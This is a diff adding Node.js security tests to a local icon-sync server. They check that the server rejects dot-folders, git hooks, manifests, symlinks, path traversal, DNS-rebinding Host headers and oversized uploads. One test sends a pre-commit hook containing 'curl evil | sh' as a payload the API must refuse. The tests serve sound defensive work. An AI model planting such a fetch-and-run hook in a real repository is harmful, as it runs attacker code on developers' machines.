@@ -77,3 +77,102 @@ test('readCatalog reads <subdir>/icons.json and refuses escaping paths', async (
   assert.equal(readCatalog(root, 'nope'), null)
   assert.throws(() => readCatalog(root, '../x'))
 })
+
+import { mkdirSync, symlinkSync } from 'node:fs'
+import { request } from 'node:http'
+import { safeGeneratedPath, safeSubdir } from './icon-sync.mjs'
+
+test('the folder must be a plain subfolder: never the root, a dot-folder or node_modules', () => {
+  for (const bad of ['.', '', '.git', '.git/hooks', '.github/workflows', '.husky', 'a/.git/x', 'node_modules/x', '../x', '/abs']) assert.equal(safeSubdir(bad), null, bad)
+  assert.equal(safeSubdir('src/icons'), 'src/icons')
+})
+
+test('only plain generated asset types, no dot-files or manifests', () => {
+  for (const bad of ['.env', 'a/.git/hooks/pre-commit', 'pre-commit', 'package.json', 'x/tsconfig.json', 'run.sh', 'a.mjs', 'noext']) assert.equal(safeGeneratedPath(bad), false, bad)
+  for (const good of ['svg/a.svg', 'angular/icons/home.ts', 'html/index.html', 'icons.json', 'README.md', 'web-component/x-icon.js', 'web-component/x-icon.d.ts']) assert.equal(safeGeneratedPath(good), true, good)
+})
+
+test('a hook cannot be planted through the API', async () => {
+  const dir = mkdtempSync(join(tmpdir(), 'ilt-'))
+  const s = await startServer({ dir, port: 0 })
+  try {
+    assert.equal((await post(s, { subdir: '.git/hooks', files: { 'pre-commit': 'curl evil | sh' } })).status, 400)
+    assert.equal((await post(s, { subdir: '.', files: { 'package.json': '{}' } })).status, 400)
+    assert.equal((await post(s, { subdir: 'icons', files: { '.git/config': 'x' } })).status, 400)
+    assert.equal((await post(s, { subdir: 'icons', files: { 'run.sh': 'x' } })).status, 400)
+    assert.equal(existsSync(join(dir, '.git')), false)
+  } finally {
+    s.server.close()
+  }
+})
+
+test('symlinks are refused (write, read and delete)', async () => {
+  const dir = mkdtempSync(join(tmpdir(), 'ilt-'))
+  const outside = mkdtempSync(join(tmpdir(), 'ilt-out-'))
+  writeFileSync(join(outside, 'secret.json'), '{"secret":true}')
+  symlinkSync(outside, join(dir, 'icons'))
+  const s = await startServer({ dir, port: 0 })
+  try {
+    assert.equal((await post(s, { subdir: 'icons', files: { 'a.svg': '1' } })).status, 400)
+    assert.equal(existsSync(join(outside, 'a.svg')), false)
+    const res = await fetch(`http://127.0.0.1:${s.port}/catalog?subdir=icons`, { headers: { 'x-toolkit-token': s.token } })
+    assert.equal(res.status, 400)
+  } finally {
+    s.server.close()
+  }
+})
+
+test('a tampered managed list cannot delete project files', async () => {
+  const dir = mkdtempSync(join(tmpdir(), 'ilt-'))
+  mkdirSync(join(dir, 'icons'))
+  writeFileSync(join(dir, 'package.json'), '{}')
+  writeFileSync(join(dir, 'icons', 'keep.sh'), 'x')
+  writeFileSync(join(dir, 'icons', '.icon-toolkit.json'), JSON.stringify({ files: ['../package.json', 'keep.sh', '.hidden'] }))
+  const s = await startServer({ dir, port: 0 })
+  try {
+    const r = await post(s, { subdir: 'icons', files: { 'a.svg': '1' } })
+    assert.equal(r.status, 200)
+    assert.equal(existsSync(join(dir, 'package.json')), true)
+    assert.equal(existsSync(join(dir, 'icons', 'keep.sh')), true)
+  } finally {
+    s.server.close()
+  }
+})
+
+test('requests with a foreign Host header are refused (DNS rebinding)', async () => {
+  const dir = mkdtempSync(join(tmpdir(), 'ilt-'))
+  const s = await startServer({ dir, port: 0 })
+  try {
+    const status = await new Promise((resolve, reject) => {
+      const req = request({ host: '127.0.0.1', port: s.port, path: '/status', headers: { host: 'evil.example:80', 'x-toolkit-token': s.token } }, (res) => {
+        res.resume()
+        resolve(res.statusCode)
+      })
+      req.on('error', reject)
+      req.end()
+    })
+    assert.equal(status, 403)
+    const ok = await fetch(`http://127.0.0.1:${s.port}/status`, { headers: { 'x-toolkit-token': s.token } })
+    assert.equal(ok.status, 200)
+  } finally {
+    s.server.close()
+  }
+})
+
+test('oversized bodies are refused up front', async () => {
+  const dir = mkdtempSync(join(tmpdir(), 'ilt-'))
+  const s = await startServer({ dir, port: 0 })
+  try {
+    const status = await new Promise((resolve) => {
+      const req = request({ host: '127.0.0.1', port: s.port, path: '/export', method: 'POST', headers: { 'content-length': String(30 * 1024 * 1024), 'x-toolkit-token': s.token, 'content-type': 'application/json' } }, (res) => {
+        res.resume()
+        resolve(res.statusCode)
+      })
+      req.on('error', () => resolve(0))
+      req.end('{}')
+    })
+    assert.ok(status === 413 || status === 0)
+  } finally {
+    s.server.close()
+  }
+})
